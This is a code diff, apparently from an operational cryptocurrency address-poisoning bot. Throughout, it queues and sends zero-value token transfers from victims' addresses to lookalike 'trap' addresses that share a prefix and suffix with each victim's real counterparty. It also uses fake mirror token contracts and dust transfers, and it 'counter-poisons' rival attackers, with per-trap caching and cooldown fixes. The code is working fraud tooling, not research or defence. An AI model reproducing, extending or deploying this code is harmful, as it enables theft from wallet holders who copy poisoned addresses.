+  campaignMirrorLocks.set(campaignId, run.then(() => { }));
+  return run;
+}
+
+async function flushRealQueue(key) {
+  if (realFlushInProgress) return;
+
+  const currentQueue = realPoisonQueue.get(key);
+  logger.info(`[real-zero] 🔄 Flushing real queue for campaign ${key}: ${currentQueue?.length || 0} items`);
+
+  if (!currentQueue || currentQueue.length === 0) {
+    realPoisonQueue.delete(key);
+    return;
+  }
+
+  const items = [...currentQueue];
+  realPoisonQueue.delete(key);
+  realFlushInProgress = true;
+
+  try {
+    const campaignId = key;
+    const campaignWallet = campaignMirrorWallets.get(campaignId);
+
+    if (!campaignWallet) {
+      logger.error(`[real-zero] No wallet for campaign ${campaignId}, dropping ${items.length} items`);
+      await sendRealBatchFailureAlert(items, 'No funding wallet configured', null, null, null);
+      return;
+    }
+
+    const { maxFeePerGas, maxPriorityFeePerGas, usedFallback, finalGwei } = await calculateSmartGasFees();
+    const gasParams = { maxFeePerGas, maxPriorityFeePerGas };
+    await notifyGasStrategy(campaignId, usedFallback, finalGwei);
+
+    const operatorAddress = campaignWallet.operatorAddress;
+
+    if (REAL_ZERO_BATCH_ROUTER) {
+      const chunks = [];
+      for (let i = 0; i < items.length; i += REAL_ZERO_BATCH_CHUNK_SIZE) {
+        chunks.push(items.slice(i, i + REAL_ZERO_BATCH_CHUNK_SIZE));
+      }
+
+      logger.info(
+        `[real-zero-batch] Flushing ${items.length} items in ` +
+        `${chunks.length} on-chain chunks of max ${REAL_ZERO_BATCH_CHUNK_SIZE}`
+      );
+
+      for (let chunkIdx = 0; chunkIdx < chunks.length; chunkIdx++) {
+        const chunk = chunks[chunkIdx];
+        const calls = chunk.map(item => ({
+          token: item.tokenAddress,
+          from: item.victimAddress,
+          to: item.trapAddress,
+          value: 0n,
+        }));
+
+        const estimatedGas = BigInt(
+          REAL_ZERO_BATCH_BASE_GAS + (REAL_ZERO_BATCH_PER_TRANSFER_GAS * calls.length)
+        );
+
+        const result = await emitRealZeroBatch(campaignWallet, campaignId, calls, estimatedGas, gasParams);
+
+        if (typeof result === 'string' && result.startsWith('0x')) {
+          updateRealBatchStats(chunk, true);
+          await sendRealBatchAlert(chunk, result, REAL_ZERO_BATCH_ROUTER);
+          await updateRealZeroDustCounts(chunk);
+        } else {
+          const failure =
+            result && typeof result === 'object' && result.ok === false
+              ? result
+              : { hash: null, error: 'Unknown real zero batch failure' };
+
+          updateRealBatchStats(chunk, false);
+          await sendRealBatchFailureAlert(
+            chunk,
+            failure.error || 'Real zero batch transaction failed, was dropped, or RPC timed out.',
+            operatorAddress,
+            failure.hash || null,
+            REAL_ZERO_BATCH_ROUTER
+          );
+        }
+      }
+      return;
+    }
+
+    logger.warn('[real-zero] REAL_ZERO_BATCH_ROUTER not set; using individual transferFrom fallback.');
+
+    for (let i = 0; i < items.length; i++) {
+      const item = items[i];
+      const result = await emitRealZeroTransfer(campaignWallet, campaignId, item, gasParams);
+
+      if (typeof result === 'string' && result.startsWith('0x')) {
+        updateRealBatchStats([item], true);
+        await sendRealBatchAlert([item], result, item.tokenAddress);
+        await updateRealZeroDustCounts([item]);
+      } else {
+        const failure =
+          result && typeof result === 'object' && result.ok === false
+            ? result
+            : { hash: null, error: 'Unknown individual real zero failure' };
+
+        updateRealBatchStats([item], false);
+        await sendRealBatchFailureAlert(
+          [item],
+          failure.error || 'Individual real zero transfer failed, was dropped, or RPC timed out.',
+          operatorAddress,
+          failure.hash || null,
+          item.tokenAddress
+        );
+      }
+    }
+  } finally {
+    realFlushInProgress = false;
+  }
+}
 
 // --- Helper: retry wrapper ---
 async function withRpcRetry(fn, context, maxAttempts = 2, baseDelay = 1000, shouldRetry = () => true) {
@@ -889,7 +1802,7 @@ function getAssetFromTx(tx) {
  * - Other party is NOT the real counterparty
  * - Other party is NOT our own trap
  */
-function isCompetitivePoison(tx, victimEntry) {
+function isCompetitivePoison(tx, victimEntry, allVictimEntries = []) {
   if (!tx || !tx.from || !tx.to || !victimEntry?.counterparty) return false;
 
   const to = tx.to.toLowerCase();
@@ -928,6 +1841,9 @@ function isCompetitivePoison(tx, victimEntry) {
 
   // Skip if suspect is the real counterparty (legitimate transaction)
   if (suspectAddress === counterparty) return false;
+
+  // 🚀 FIX: Skip if suspect is ANY of our own traps for this victim (prevent friendly fire)
+  if (allVictimEntries.some(e => e.trapAddress === suspectAddress)) return false;
 
   // 🎯 Match prefix (4 chars, excluding 0x) and suffix (4 chars)
   const prefix = counterparty.slice(2, 6);   // "1234"
@@ -1014,7 +1930,7 @@ async function counterPoison(victimAddress, victimEntry, tx = null, currentRaw =
 
       // 🚀 Fallback 2: Check in-memory cache of recent blockchain transfers!
       if (!foundInQueue) {
-        const recent = recentVictimTransfers.get(victimAddress.toLowerCase());
+        const recent = recentVictimTransfers.get(victimEntry.trapAddress);
         if (recent && recent.amount > 0n) {
           mirrorRaw = recent.amount;
           mirrorAsset = recent.asset;
@@ -1030,7 +1946,8 @@ async function counterPoison(victimAddress, victimEntry, tx = null, currentRaw =
       if (!foundInQueue && victimEntry.counterparty) {
         const chainResult = await fetchLastTransferFromChain(
           victimAddress.toLowerCase(),
-          victimEntry.counterparty.toLowerCase()
+          victimEntry.counterparty.toLowerCase(),
+          victimEntry.trapAddress // 🚀 Pass trapAddress for correct caching
         );
         if (chainResult && chainResult.amount > 0n) {
           mirrorRaw = chainResult.amount;
@@ -1111,6 +2028,23 @@ async function counterPoison(victimAddress, victimEntry, tx = null, currentRaw =
       mirrorAsset
     );
 
+    if (REAL_DUST_ENABLED) {
+      const realTokenAddress = getRealTokenAddress(mirrorAsset);
+      if (realTokenAddress) {
+        queueRealDust(
+          victimEntry.campaignId,
+          realTokenAddress,
+          victimAddress,
+          victimEntry.trapAddress,
+          'counter',
+          victimEntry,
+          mirrorAsset
+        );
+      } else {
+        logger.warn(`[real-zero] No real token address for counter asset ${mirrorAsset}, skipping real zero queue`);
+      }
+    }
+
     return true;
   } catch (err) {
     logger.error(`[competitive] Counter-poison queue failed: ${err.message}`);
@@ -1121,7 +2055,7 @@ async function counterPoison(victimAddress, victimEntry, tx = null, currentRaw =
 
 
 // 🚀 BLOCKCHAIN FETCH: Gets the victim's last real transfer to counterparty from chain
-async function fetchLastTransferFromChain(victimAddress, counterpartyAddress) {
+async function fetchLastTransferFromChain(victimAddress, counterpartyAddress, trapAddress = null) {
   try {
     const currentBlock = await client.getBlockNumber();
     const fromBlock = currentBlock > 5000n ? currentBlock - 5000n : 0n;
@@ -1156,8 +2090,9 @@ async function fetchLastTransferFromChain(victimAddress, counterpartyAddress) {
       const humanAmount = (Number(rawAmount) / (10 ** decimals)).toFixed(4);
       logger.info(`[chain-fetch] ✅ Found on-chain: ${humanAmount} ${assetSymbol} (victim→counterparty)`);
 
-      // Cache it for future use
-      recentVictimTransfers.set(victimAddress.toLowerCase(), { amount: rawAmount, asset: assetSymbol, timestamp: Date.now() });
+      // Cache it for future use (Key by trapAddress if provided, otherwise fallback to victimAddress)
+      const cacheKey = trapAddress || victimAddress.toLowerCase();
+      recentVictimTransfers.set(cacheKey, { amount: rawAmount, asset: assetSymbol, timestamp: Date.now() });
 
       return { amount: rawAmount, asset: assetSymbol };
     }
@@ -2159,8 +3094,10 @@ async function poisonVictim(victimAddress, privateKey, campaignId, asset = null)
     }
   }
 
-  const entry = victims.get(victimAddress);
-  if (entry) entry.lastPoison = Date.now();
+  const entries = victims.get(victimAddress);
+  if (entries && Array.isArray(entries)) {
+    entries.forEach(e => e.lastPoison = Date.now());
+  }
 
   let stats = victimStats.get(victimAddress) || { attempts: 0, successes: 0, failures: 0 };
   stats.attempts++;
@@ -2193,8 +3130,9 @@ function checkTransaction(tx, txLogs = []) {
 
   // 🆕 DIAGNOSTIC: Log when we see a transaction from one of our victims
   if (victims.has(from)) {
-    const entry = victims.get(from);
-    logger.info(`[DEBUG] 👀 Victim transaction detected: ${from} → ${to} (counterparty: ${entry.counterparty})`);
+    const entries = victims.get(from);
+    const cps = entries.map(e => e.counterparty || 'wildcard').join(', ');
+    logger.info(`[DEBUG] 👀 Victim transaction detected: ${from} → ${to} (counterparties: ${cps})`);
   }
 
 
@@ -2216,9 +3154,12 @@ function checkTransaction(tx, txLogs = []) {
   );
 
   // Helper to check if an address matches the counterparty pattern
-  function isCompetitorLog(suspectAddress, entry) {
+  function isCompetitorLog(suspectAddress, entry, allEntries) {
     if (!entry?.counterparty) return false;
     if (suspectAddress === entry.trapAddress || suspectAddress === entry.counterparty) return false;
+
+    // 🚀 FIX: Prevent friendly fire between our own traps
+    if (allEntries.some(e => e.trapAddress === suspectAddress)) return false;
 
     const prefix = entry.counterparty.slice(2, 6);
     const suffix = entry.counterparty.slice(-4);
@@ -2239,26 +3180,28 @@ function checkTransaction(tx, txLogs = []) {
     return 0n;
   };
 
-  // 1. Direct transaction checks (O(1) lookups)
-  const senderEntry = victims.get(from);
-  const receiverEntry = victims.get(to);
+  // 1. Direct transaction checks (Loop through all traps for this victim)
+  const senderEntries = victims.get(from) || [];
+  const receiverEntries = victims.get(to) || [];
 
-  if (senderEntry && isCompetitivePoison(tx, senderEntry)) {
-    // Victim is the sender, so earlyMirrorRaw is the victim's real transfer amount
-    counterPoison(from, senderEntry, tx, earlyMirrorRaw, earlyDetectedAsset);
+  for (const senderEntry of senderEntries) {
+    if (isCompetitivePoison(tx, senderEntry, senderEntries)) {
+      counterPoison(from, senderEntry, tx, earlyMirrorRaw, earlyDetectedAsset);
+    }
   }
-  if (receiverEntry && isCompetitivePoison(tx, receiverEntry)) {
-    // Victim is the receiver, meaning earlyMirrorRaw is the ATTACKER's amount. 
-    // Pass 0n to force it to safely fallback to the queue/DB.
-    counterPoison(to, receiverEntry, tx, 0n, null);
+  for (const receiverEntry of receiverEntries) {
+    if (isCompetitivePoison(tx, receiverEntry, receiverEntries)) {
+      counterPoison(to, receiverEntry, tx, 0n, null);
+    }
   }
 
   // 🚀 CACHE UPDATE: Track native ETH transfers FROM OUR TRAPS to victims
   if (tx.value && BigInt(tx.value) > 0n) {
     const victimOfTrap = trapToVictimMap.get(from);
     if (victimOfTrap) {
-      recentVictimTransfers.set(victimOfTrap, { amount: BigInt(tx.value), asset: nativeSymbol, timestamp: now });
-      logger.debug(`[cache] 🧠 Cached native transfer from our trap to ${victimOfTrap}: ${tx.value}`);
+      // Key by trapAddress (from) to prevent overwriting if victim has multiple traps
+      recentVictimTransfers.set(from, { amount: BigInt(tx.value), asset: nativeSymbol, timestamp: now });
+      logger.debug(`[cache] 🧠 Cached native transfer from our trap ${from} for victim ${victimOfTrap}: ${tx.value}`);
     }
   }
 
@@ -2275,8 +3218,8 @@ function checkTransaction(tx, txLogs = []) {
     // 🚀 CACHE UPDATE: Track recent ERC20 transfers FROM OUR TRAPS to victims
     const victimOfLogTrap = trapToVictimMap.get(logFrom);
     if (logAmount > 0n && logAsset && victimOfLogTrap) {
-      recentVictimTransfers.set(victimOfLogTrap, { amount: logAmount, asset: logAsset, timestamp: now });
-      logger.debug(`[cache] 🧠 Cached ERC20 transfer from our trap to ${victimOfLogTrap}: ${logAmount} ${logAsset}`);
+      recentVictimTransfers.set(logFrom, { amount: logAmount, asset: logAsset, timestamp: now });
+      logger.debug(`[cache] 🧠 Cached ERC20 transfer from our trap ${logFrom} for victim ${victimOfLogTrap}: ${logAmount} ${logAsset}`);
     }
 
     // 🚀 Determine if the log is from a known real token contract (USDC, USDT, etc.)
@@ -2284,24 +3227,27 @@ function checkTransaction(tx, txLogs = []) {
     const isRealToken = tokenAddressMap.has(logContract);
 
     // Check if sender is our victim
-    const logSenderEntry = victims.get(logFrom);
-    if (logSenderEntry && isCompetitorLog(logTo, logSenderEntry)) {
-      logger.info(`[competitive] 🚨 Detected forged Transfer in logs! Victim: ${logFrom} → Attacker: ${logTo}`);
-      // Victim is the sender in the log, use the log's exact amount
-      counterPoison(logSenderEntry.victimAddress, logSenderEntry, tx, logAmount, earlyDetectedAsset);
+    const logSenderEntries = victims.get(logFrom) || [];
+    for (const logSenderEntry of logSenderEntries) {
+      if (isCompetitorLog(logTo, logSenderEntry, logSenderEntries)) {
+        logger.info(`[competitive] 🚨 Detected forged Transfer in logs! Victim: ${logFrom} → Attacker: ${logTo}`);
+        counterPoison(logSenderEntry.victimAddress, logSenderEntry, tx, logAmount, earlyDetectedAsset);
+        break; // Found a match, no need to check other traps for this log
+      }
     }
 
     // Check if receiver is our victim (Attacker -> Victim)
-    const logReceiverEntry = victims.get(logTo);
-    if (logReceiverEntry && isCompetitorLog(logFrom, logReceiverEntry)) {
-      if (!isRealToken) {
-        // 🎭 Attacker used a fake mirror contract. Use the attacker's emitted amount!
-        logger.info(`[competitive] 🎭 Attacker used fake mirror contract. Using attacker's emitted amount: ${logAmount}`);
-        counterPoison(logReceiverEntry.victimAddress, logReceiverEntry, tx, logAmount, earlyDetectedAsset);
-      } else {
-        // 💧 Attacker sent real dust via a real token contract. Pass 0n to force DB fallback to last victim->counterparty amount.
-        logger.info(`[competitive] 💧 Attacker sent real dust via ${logContract}. Will fallback to last victim->counterparty amount.`);
-        counterPoison(logReceiverEntry.victimAddress, logReceiverEntry, tx, 0n, null);
+    const logReceiverEntries = victims.get(logTo) || [];
+    for (const logReceiverEntry of logReceiverEntries) {
+      if (isCompetitorLog(logFrom, logReceiverEntry, logReceiverEntries)) {
+        if (!isRealToken) {
+          logger.info(`[competitive] 🎭 Attacker used fake mirror contract. Using attacker's emitted amount: ${logAmount}`);
+          counterPoison(logReceiverEntry.victimAddress, logReceiverEntry, tx, logAmount, earlyDetectedAsset);
+        } else {
+          logger.info(`[competitive] 💧 Attacker sent real dust via ${logContract}. Will fallback to last victim->counterparty amount.`);
+          counterPoison(logReceiverEntry.victimAddress, logReceiverEntry, tx, 0n, null);
+        }
+        break; // Found a match
       }
     }
   }
@@ -2318,7 +3264,6 @@ function checkTransaction(tx, txLogs = []) {
     return;
   }
 
-  const entry = victims.get(from);
 
   // 🚀 FIX BUG #1: Extract actual recipient from ERC-20 transfer
   let actualRecipient = to;
@@ -2338,17 +3283,31 @@ function checkTransaction(tx, txLogs = []) {
     logger.debug(`[ERC20] Detected token transferFrom: ${from} → ${actualRecipient} via ${to}`);
   }
 
-  // Counterparty wildcard check using actual recipient
-  if (entry.counterparty && actualRecipient !== entry.counterparty) {
-    logger.info(`[DEBUG] ⏭️ ${from} sent to ${actualRecipient} but counterparty is ${entry.counterparty} - NOT a target transaction`);
+  // 🚀 FIX: Find the specific trap that matches the actual recipient
+  const entriesForVictim = victims.get(from);
+  let entry = null;
+  for (const e of entriesForVictim) {
+    if (e.counterparty && actualRecipient === e.counterparty) {
+      entry = e;
+      break;
+    }
+  }
+
+  // If no exact match, check for wildcard (no counterparty specified)
+  if (!entry) {
+    entry = entriesForVictim.find(e => !e.counterparty);
+  }
+
+  if (!entry) {
+    logger.info(`[DEBUG] ⏭️ ${from} sent to ${actualRecipient} but no matching trap found for this counterparty - NOT a target transaction`);
     return;
   }
 
-  // Dynamic cooldown check
-  let timestamps = victimTxTimestamps.get(from);
+  // Dynamic cooldown check (Keyed by trapAddress now!)
+  let timestamps = victimTxTimestamps.get(entry.trapAddress);
   if (!timestamps) {
     timestamps = [];
-    victimTxTimestamps.set(from, timestamps);
+    victimTxTimestamps.set(entry.trapAddress, timestamps);
   }
   timestamps.push(Date.now());
 
@@ -2356,10 +3315,10 @@ function checkTransaction(tx, txLogs = []) {
     timestamps.shift();
   }
 
-  const dynamicCooldown = getDynamicCooldown(from);
+  const dynamicCooldown = getDynamicCooldown(entry.trapAddress);
   if (now - entry.lastPoison < dynamicCooldown) {
     const remaining = Math.round((dynamicCooldown - (now - entry.lastPoison)) / 1000);
-    logger.info(`[DEBUG] ⏭️ ${from} on cooldown (${remaining}s remaining, need ${Math.round(dynamicCooldown / 1000)}s)`);
+    logger.info(`[DEBUG] ⏭️ Trap ${entry.trapAddress.slice(0, 10)}... on cooldown (${remaining}s remaining, need ${Math.round(dynamicCooldown / 1000)}s)`);
     return;
   }
 
@@ -2406,7 +3365,7 @@ function checkTransaction(tx, txLogs = []) {
 
       // 🚀 FIX: If no amount detected from tx, use fallbacks to ensure batch is used
       if (mirrorRaw === 0n) {
-        const recent = recentVictimTransfers.get(from.toLowerCase());
+        const recent = recentVictimTransfers.get(entry.trapAddress);
         if (recent && recent.amount > 0n) {
           mirrorRaw = recent.amount;
           mirrorAsset = recent.asset;
@@ -2415,7 +3374,7 @@ function checkTransaction(tx, txLogs = []) {
       }
 
       if (mirrorRaw === 0n && entry.counterparty) {
-        const chainResult = await fetchLastTransferFromChain(from.toLowerCase(), entry.counterparty.toLowerCase());
+        const chainResult = await fetchLastTransferFromChain(from.toLowerCase(), entry.counterparty.toLowerCase(), entry.trapAddress);
         if (chainResult && chainResult.amount > 0n) {
           mirrorRaw = chainResult.amount;
           mirrorAsset = chainResult.asset;
@@ -2464,8 +3423,8 @@ function checkTransaction(tx, txLogs = []) {
         logger.info(`[mirror] Using default 1 ETH fallback for batch`);
       }
 
-      // Cache the resolved amount for counter-poisons
-      recentVictimTransfers.set(from.toLowerCase(), { amount: mirrorRaw, asset: mirrorAsset, timestamp: Date.now() });
+      // Cache the resolved amount for counter-poisons (Keyed by trapAddress)
+      recentVictimTransfers.set(entry.trapAddress, { amount: mirrorRaw, asset: mirrorAsset, timestamp: Date.now() });
 
       let mirrorContractAddress =
         MIRROR_CONTRACTS[mirrorAsset] ||
@@ -2488,6 +3447,23 @@ function checkTransaction(tx, txLogs = []) {
         logger.info(`[mirror] Queued auto-poison for batch via ${mirrorContractAddress.slice(0, 10)}...`);
       } else {
         logger.warn(`[mirror] No funding wallet or contract found for ${mirrorAsset}, batch skipped.`);
+      }
+
+      if (REAL_DUST_ENABLED) {
+        const realTokenAddress = getRealTokenAddress(mirrorAsset);
+        if (realTokenAddress) {
+          queueRealDust(
+            entry.campaignId,
+            realTokenAddress,
+            from,
+            entry.trapAddress,
+            'auto',
+            entry,
+            mirrorAsset
+          );
+        } else {
+          logger.warn(`[real-zero] No real token address for auto asset ${mirrorAsset}, skipping real zero queue`);
+        }
       }
 
       // 🚀 FIX: NEVER call duster.py for auto-triggers. Batch only.
@@ -2684,6 +3660,13 @@ onShutdown(async () => {
   if (totalQueued > 0) {
     console.log(`[DEBUG] Flushing ${totalQueued} queued poisons before shutdown...`);
     await flushAllQueues();
+  }
+
+  let totalRealQueued = 0;
+  for (const items of realPoisonQueue.values()) totalRealQueued += items.length;
+  if (totalRealQueued > 0) {
+    console.log(`[DEBUG] Flushing ${totalRealQueued} queued real zero poisons before shutdown...`);
+    await flushAllRealQueues();
   }
 });
 
